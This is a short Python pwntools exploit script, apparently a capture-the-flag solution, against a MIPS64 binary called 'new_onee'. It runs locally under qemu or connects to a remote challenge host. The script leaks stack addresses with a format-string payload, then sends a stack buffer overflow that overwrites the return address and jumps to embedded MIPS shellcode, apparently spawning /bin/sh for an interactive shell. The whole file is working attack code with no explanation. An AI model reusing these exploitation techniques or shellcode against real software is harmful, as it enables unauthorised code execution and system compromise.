from pwn import *
import sys

if args.REMOTE:
	host = 'gc1.eng.run'
	port = 31114
	p = remote(host, port)
elif args.DEBUG:
	p = process(['qemu-mips64el', '-g', '1234', 'new_onee'])
else:
	p = process(['qemu-mips64el', 'new_onee'])

p.recvlines(9)
p.send(b'A')

payload = b'%llx|' * 20
p.sendline(payload)
p.recvlines(8)
leaks = p.recvline()[:-2].decode().split('|')

p.recvlines(5)
p.sendline(b'1')

p.recvlines(8)
p.sendline(b'C')
p.recvlines(9)

shellcode = b'\x62\x69\x0c\x3c\x2f\x2f\x8c\x35\xf4\xff\xac\xaf\x73\x68\x0d\x3c\x6e\x2f\xad\x35\xf8\xff\xad\xaf\xfc\xff\xa0\xaf\xf4\xff\xa4\x67\xff\xff\x05\x28\xff\xff\x06\x28\xc1\x13\x02\x24\x0c\x01\x01\x01'
ra = int(leaks[0], 16) + 0x430

payload = b'A' * 40
payload += p64(ra)
payload += shellcode

p.sendline(payload)
p.recvuntil(b'+\n\n')

p.interactive()
p.close()